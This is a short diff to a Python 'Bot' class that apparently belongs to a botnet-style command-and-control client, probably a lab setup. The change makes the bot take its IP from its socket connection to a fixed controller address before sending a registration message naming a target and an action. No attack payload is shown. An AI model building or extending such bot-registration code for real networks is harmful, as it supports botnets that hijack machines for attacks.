@@ -46,7 +46,7 @@ def readMessage(s):
 
 
 class Bot:
-    myIp = socket.gethostbyname(socket.gethostname())
+    myIp = None
     host = '10.0.2.10'
     port = 49171
     httpPort = 80
@@ -65,6 +65,7 @@ class Bot:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((self.host, self.port))
+            self.myIp = s.getsockname()[0]
             message = self.myIp + ' {"http":' + str(self.httpPort) + ',"irc":' + str(
                 self.ircPort) + ',"target":"-","action":"waiting"}'
             while message != 'bot registrated succesfully':
